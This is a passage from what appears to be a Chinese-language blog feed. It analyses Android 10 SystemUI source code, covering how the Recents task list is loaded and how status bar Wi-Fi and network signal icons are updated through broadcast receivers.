java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RecentsModel继承了TaskStackChangeListener，在构造方法内部初始化了RecentsTaskList、TaskIconCache和TaskThumbnailCache实例，注册了registerTaskStackListener回调；分别来获取最近任务列表、获取Task对应的Icon和，</span><br><span class="line">   RecentsTaskList：获取最近任务列表；</span><br><span class="line">   TaskIconCache：获取Task对应的icon，并进行缓存；</span><br><span class="line">   TaskThumbnailCache：获取Task对应的thumbnailData，并进行缓存；</span><br><span class="line">   与Android8<span class="number">.1</span>不同的是，<span class="number">8.1</span>上在获取最近任务列表后会获取任务对应的Thumbnail和Icon，最终封装成Task，在显示时直接通过Task.thumbnail和Task.icon就可以直接显示；<span class="number">11</span>上会通过TaskIconCache和TaskThumbnailCache进行分别存储管理，首次显示或有新的任务，需要通过TaskIconCache和TaskThumbnailCache执行对应的request去获取并进行cache存储；</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getTasks</span><span class="params">(Consumer&lt;ArrayList&lt;Task&gt;&gt; callback)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mTaskList.getTasks(<span class="literal">false</span> <span class="comment">/* loadKeysOnly */</span>, callback);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行getTasks时，实际是通过RecentsTaskList的getTasks()来执行的；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onTaskSnapshotChanged</span><span class="params">(<span class="type">int</span> taskId, ThumbnailData snapshot)</span> &#123;</span><br><span class="line">    mThumbnailCache.updateTaskSnapShot(taskId, snapshot);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> mThumbnailChangeListeners.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="type">Task</span> <span class="variable">task</span> <span class="operator">=</span> mThumbnailChangeListeners.get(i).onTaskThumbnailChanged(taskId, snapshot);</span><br><span class="line">        <span class="keyword">if</span> (task != <span class="literal">null</span>) &#123;</span><br><span class="line">            task.thumbnail = snapshot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当Task的snapshot截取完毕后，会收到onTaskSnapshotChanged()回调，先对snapshot进行缓存，然后执行onTaskThumbnailChanged()通知，在RecentsView里面对thumbnail进行更新；</p><h4 id="5-RecentsTaskList-java"><a href="#5-RecentsTaskList-java" class="headerlink" title="5.RecentsTaskList.java"></a>5.RecentsTaskList.java</h4><p>获取最近任务列表类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTasks</span><span class="params">(<span class="type">boolean</span> loadKeysOnly, Consumer&lt;ArrayList&lt;Task&gt;&gt; callback)</span> &#123;</span><br><span class="line">    <span class="comment">// Kick off task loading in the background</span></span><br><span class="line">    UI_HELPER_EXECUTOR.execute(() -&gt; &#123;</span><br><span class="line">       <span class="keyword">if</span> (!mResultsBg.isValidForRequest(requestLoadId, loadKeysOnly)) &#123;</span><br><span class="line">            mResultsBg = loadTasksInBackground(Integer.MAX_VALUE, requestLoadId, loadKeysOnly);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">TaskLoadResult</span> <span class="variable">loadResult</span> <span class="operator">=</span> mResultsBg;</span><br><span class="line">       mMainThreadExecutor.execute(() -&gt; &#123;</span><br><span class="line">           mResultsUi = loadResult;</span><br><span class="line">           <span class="keyword">if</span> (callback != <span class="literal">null</span>) &#123;</span><br><span class="line">               ArrayList&lt;Task&gt; result = copyOf(mResultsUi);</span><br><span class="line">               callback.accept(result);</span><br><span class="line">           &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">   <span class="keyword">return</span> requestLoadId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在getTasks()内部通过loadTasksInBackgroud()来获取TaskLoadResult对象mResultsBg，然后在主线程里面进行回调，最终执行到RecentsView里面的applyLoadPlan()是在主线程里面刷新UI；先看一下loadTasksInBackground()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">TaskLoadResult <span class="title function_">loadTasksInBackground</span><span class="params">(<span class="type">int</span> numTasks, <span class="type">int</span> requestId, <span class="type">boolean</span> loadKeysOnly)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">currentUserId</span> <span class="operator">=</span> Process.myUserHandle().getIdentifier();</span><br><span class="line">    List&lt;ActivityManager.RecentTaskInfo&gt; rawTasks =</span><br><span class="line">                mActivityManagerWrapper.getRecentTasks(numTasks, currentUserId);</span><br><span class="line">    <span class="comment">// The raw tasks are given in most-recent to least-recent order, we need to reverse it</span></span><br><span class="line">    Collections.reverse(rawTasks);</span><br><span class="line">    <span class="type">TaskLoadResult</span> <span class="variable">allTasks</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TaskLoadResult</span>(requestId, loadKeysOnly, rawTasks.size());</span><br><span class="line">    <span class="keyword">for</span> (ActivityManager.RecentTaskInfo rawTask : rawTasks) &#123;</span><br><span class="line">        Task.<span class="type">TaskKey</span> <span class="variable">taskKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Task</span>.TaskKey(rawTask);</span><br><span class="line">        Task task;</span><br><span class="line">        <span class="keyword">if</span> (!loadKeysOnly) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLocked</span> <span class="operator">=</span> tmpLockedUsers.get(taskKey.userId);</span><br><span class="line">            task = Task.from(taskKey, rawTask, isLocked);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            task = <span class="keyword">new</span> <span class="title class_">Task</span>(taskKey);</span><br><span class="line">        &#125;</span><br><span class="line">        allTasks.add(task);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> allTasks;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在loadTasksInBackgroud()内部，通过ActivityManagerWrapper的getRecentTasks()来获取rawTasks，然后反向排序，最后将其处理添加到allTasks，然后返回结果；</p><h4 id="6-ActivityManagerWrapper-java"><a href="#6-ActivityManagerWrapper-java" class="headerlink" title="6.ActivityManagerWrapper.java"></a>6.ActivityManagerWrapper.java</h4><p>SystemUI与SystemServer交互类<br><strong>frameworks/base/packages/SystemUI/shared/src/com/android/systemui/shared/system/ActivityManagerWrapper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;RecentTaskInfo&gt; <span class="title function_">getRecentTasks</span><span class="params">(<span class="type">int</span> numTasks, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> ActivityTaskManager.getService().getRecentTasks(numTasks,RECENT_IGNORE_UNAVAILABLE, userId).getList();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@NonNull</span> ThumbnailData <span class="title function_">getTaskThumbnail</span><span class="params">(<span class="type">int</span> taskId, <span class="type">boolean</span> isLowResolution)</span> &#123;</span><br><span class="line">    ActivityManager.<span class="type">TaskSnapshot</span> <span class="variable">snapshot</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        snapshot = ActivityTaskManager.getService().getTaskSnapshot(taskId, isLowResolution);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        Log.w(TAG, <span class="string">&quot;Failed to retrieve task snapshot&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (snapshot != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThumbnailData</span>(snapshot);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ThumbnailData</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">startActivityFromRecents</span><span class="params">(<span class="type">int</span> taskId, ActivityOptions options)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Bundle</span> <span class="variable">optsBundle</span> <span class="operator">=</span> options == <span class="literal">null</span> ? <span class="literal">null</span> : options.toBundle();</span><br><span class="line">        ActivityTaskManager.getService().startActivityFromRecents(taskId, optsBundle);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ActivityManagerWrapper提供了跟systemserver交互的接口，相当于Android8.1中的SystemServicesProxy功能；<br>  <br>用一张流程图总结显示过程：</p><p><img src="/images/20231202/20231202003.png"></p><p>以上就是对Android10.0 Recents功能的分析，功能实现由之前一个进程拆分到两个进程，其他处理基本上保持一致。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 10.0 状态栏系统图标显示分析</title>
      <link href="/2023/11/26/2023-11-26/"/>
      <url>/2023/11/26/2023-11-26/</url>
      
        <content type="html"><![CDATA[<p>SystemUI中StatusBar的图标控制器实现类为StatusBarIconControllerImpl，其继承了StatusBarIconController的接口，用于跟踪所有图标的状态，并将对应的状态发送给注册的图标管理器(IconManagers)。当我们在StatusBar中获取到它的实例后，还会将它传给PhoneStatusBarPolicy和StatusBarSignalPolicy对象。PhoneStatusBarPolicy控制启动时装载哪些图标（蓝牙，定位等），而StatusBarSignalPolicy控制网络信号图标（移动网络，WiFi，以太网）的变化。<br>一起来看 StatuBar 的 start() 方法：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBarSignalPolicy.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// 创建整个SystemUI视图并添加到WindowManager中</span></span><br><span class="line">    createAndAddWindows();<span class="comment">//这个重点方法，创建相关的视图</span></span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// Lastly, call to the icon policy to install/update all the icons.</span></span><br><span class="line">    mIconPolicy.init();</span><br><span class="line">    mSignalPolicy = <span class="keyword">new</span> <span class="title class_">StatusBarSignalPolicy</span>(mContext, mIconController);</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 mIconPolicy 就是 PhoneStatusBarPolicy对象，mSignalPolicy  就是 StatusBarSignalPolicy 对象。我们这里以 StatusBarSignalPolicy  为例去研究。<br>StatusBarSignalPolicy实现了NetworkControllerImpl.SignalCallback接口，SignalCallback接口定义在NetworkControllerImpl实现的接口NetworkController中。<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/policy/NetworkControllerImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Inject</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">NetworkControllerImpl</span><span class="params">(Context context, <span class="meta">@Background</span> Looper bgLooper,</span></span><br><span class="line"><span class="params">        DeviceProvisionedController deviceProvisionedController,</span></span><br><span class="line"><span class="params">        BroadcastDispatcher broadcastDispatcher, ConnectivityManager connectivityManager,</span></span><br><span class="line"><span class="params">        TelephonyManager telephonyManager, WifiManager wifiManager,</span></span><br><span class="line"><span class="params">        NetworkScoreManager networkScoreManager)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(context, connectivityManager,</span><br><span class="line">            telephonyManager,</span><br><span class="line">            wifiManager,</span><br><span class="line">            networkScoreManager,</span><br><span class="line">            SubscriptionManager.from(context), Config.readConfig(context), bgLooper,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">CallbackHandler</span>(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">AccessPointControllerImpl</span>(context),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">DataUsageController</span>(context),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">SubscriptionDefaults</span>(),</span><br><span class="line">            deviceProvisionedController,</span><br><span class="line">            broadcastDispatcher);</span><br><span class="line">    mReceiverHandler.post(mRegisterListeners);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Runnable</span> <span class="variable">mRegisterListeners</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        registerListeners();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">registerListeners</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mMobileSignalControllers.size(); i++) &#123;</span><br><span class="line">        <span class="type">MobileSignalController</span> <span class="variable">mobileSignalController</span> <span class="operator">=</span> mMobileSignalControllers.valueAt(i);</span><br><span class="line">        mobileSignalController.registerListener();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mSubscriptionListener == <span class="literal">null</span>) &#123;</span><br><span class="line">        mSubscriptionListener = <span class="keyword">new</span> <span class="title class_">SubListener</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    mSubscriptionManager.addOnSubscriptionsChangedListener(mSubscriptionListener);</span><br><span class="line">    mPhone.listen(mPhoneStateListener, LISTEN_ACTIVE_DATA_SUBSCRIPTION_ID_CHANGE);</span><br><span class="line">    <span class="comment">// broadcasts</span></span><br><span class="line">    <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">    <span class="comment">// wifi相关</span></span><br><span class="line">    <span class="comment">// wifi信号强度广播</span></span><br><span class="line">    filter.addAction(WifiManager.RSSI_CHANGED_ACTION);</span><br><span class="line">    <span class="comment">// wifi状态变化广播</span></span><br><span class="line">    filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);</span><br><span class="line">    <span class="comment">// wifi连接状态改变</span></span><br><span class="line">    filter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 移动网络相关</span></span><br><span class="line">    <span class="comment">// SIM卡状态改变</span></span><br><span class="line">    filter.addAction(TelephonyIntents.ACTION_SIM_STATE_CHANGED);</span><br><span class="line">    <span class="comment">// 数据语音订阅修改</span></span><br><span class="line">    filter.addAction(TelephonyIntents.ACTION_DEFAULT_DATA_SUBSCRIPTION_CHANGED);</span><br><span class="line">    filter.addAction(TelephonyIntents.ACTION_DEFAULT_VOICE_SUBSCRIPTION_CHANGED);</span><br><span class="line">    filter.addAction(TelephonyIntents.ACTION_SERVICE_STATE_CHANGED);</span><br><span class="line">    filter.addAction(TelephonyIntents.SPN_STRINGS_UPDATED_ACTION);</span><br><span class="line">    <span class="comment">// 连接状态相关</span></span><br><span class="line">    <span class="comment">// 网络连接状态发生变化</span></span><br><span class="line">    filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);</span><br><span class="line">    <span class="comment">// 网络连接可能不好</span></span><br><span class="line">    filter.addAction(ConnectivityManager.INET_CONDITION_ACTION);</span><br><span class="line">    <span class="comment">// 切换飞行模式时</span></span><br><span class="line">    filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);</span><br><span class="line">    filter.addAction(CarrierConfigManager.ACTION_CARRIER_CONFIG_CHANGED);</span><br><span class="line">    mContext.registerReceiver(<span class="built_in">this</span>, filter, <span class="literal">null</span>, mReceiverHandler);</span><br><span class="line">    mListening = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// 4.更新移动网络控制器</span></span><br><span class="line">    updateMobileControllers();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在NetworkControllerImpl 的构造方法里，最终会调用到：registerListeners() 方法进行广播的注册。<br>广播处理：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/policy/NetworkControllerImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (CHATTY) &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;onReceive: intent=&quot;</span> + intent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">        <span class="keyword">case</span> ConnectivityManager.CONNECTIVITY_ACTION:</span><br><span class="line">        <span class="keyword">case</span> ConnectivityManager.INET_CONDITION_ACTION:</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Intent.ACTION_AIRPLANE_MODE_CHANGED:</span><br><span class="line">                <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TelephonyManager.ACTION_DEFAULT_VOICE_SUBSCRIPTION_CHANGED:</span><br><span class="line">            <span class="comment">// We are using different subs now, we might be able to make calls.</span></span><br><span class="line">                <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TelephonyManager.ACTION_DEFAULT_DATA_SUBSCRIPTION_CHANGED:</span><br><span class="line">            <span class="comment">// Notify every MobileSignalController so they can know whether they are the</span></span><br><span class="line">            <span class="comment">// data sim or not.</span></span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Intent.ACTION_SIM_STATE_CHANGED:</span><br><span class="line">            <span class="comment">// Avoid rebroadcast because SysUI is direct boot aware.</span></span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Intent.ACTION_SERVICE_STATE:</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> CarrierConfigManager.ACTION_CARRIER_CONFIG_CHANGED:</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ImsManager.ACTION_IMS_SERVICE_UP:</span><br><span class="line">        <span class="keyword">case</span> ImsManager.ACTION_IMS_SERVICE_DOWN:</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ACTION_HIGH_DEF_AUDIO_SUPPORT:</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ACTION_MODEM_CHANGE:</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="type">int</span> <span class="variable">subId</span> <span class="operator">=</span> intent.getIntExtra(SubscriptionManager.EXTRA_SUBSCRIPTION_INDEX,</span><br><span class="line">                    SubscriptionManager.INVALID_SUBSCRIPTION_ID);</span><br><span class="line">            <span class="keyword">if</span> (SubscriptionManager.isValidSubscriptionId(subId)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (mMobileSignalControllers.indexOfKey(subId) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    mMobileSignalControllers.get(subId).handleBroadcast(intent);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// Can&#x27;t find this subscription...  We must be out of date.</span></span><br><span class="line">                    updateMobileControllers();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// wifi状态图标处理</span></span><br><span class="line">                <span class="comment">// No sub id, must be for the wifi.</span></span><br><span class="line">                mWifiSignalController.handleBroadcast(intent);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里以 wifi状态图标处理 为例；接下来看WifiSignalController#handleBroadcast():<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/policy/WifiSignalController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleBroadcast</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">    mWifiTracker.handleBroadcast(intent);</span><br><span class="line">    mCurrentState.enabled = mWifiTracker.enabled;</span><br><span class="line">    mCurrentState.connected = mWifiTracker.connected;</span><br><span class="line">    mCurrentState.ssid = mWifiTracker.ssid;</span><br><span class="line">    mCurrentState.rssi = mWifiTracker.rssi;</span><br><span class="line">    mCurrentState.level = mWifiTracker.level;</span><br><span class="line">    mCurrentState.statusLabel = mWifiTracker.statusLabel;</span><br><span class="line">    notifyListenersIfNecessary();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在WifiSignalController#handleBroadcast()方法中，就两个实现，一个是获取 WiFi 的状态，一个是通知更新状态。<br>我们直接看通知SignalController# notifyListenersIfNecessary() :<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/policy/SignalController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">notifyListenersIfNecessary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isDirty()) &#123;</span><br><span class="line">        saveLastState();    <span class="comment">// 保持此时的状态</span></span><br><span class="line">        notifyListeners();    <span class="comment">// 通知监听器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">notifyListeners</span><span class="params">()</span> &#123;</span><br><span class="line">    notifyListeners(mCallbackHandler);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">notifyListeners</span><span class="params">(SignalCallback callback)</span>;</span><br></pre></td></tr></table></figure><p>notifyListener()方法的实现在WifiSignalController类中：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/policy/WifiSignalController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 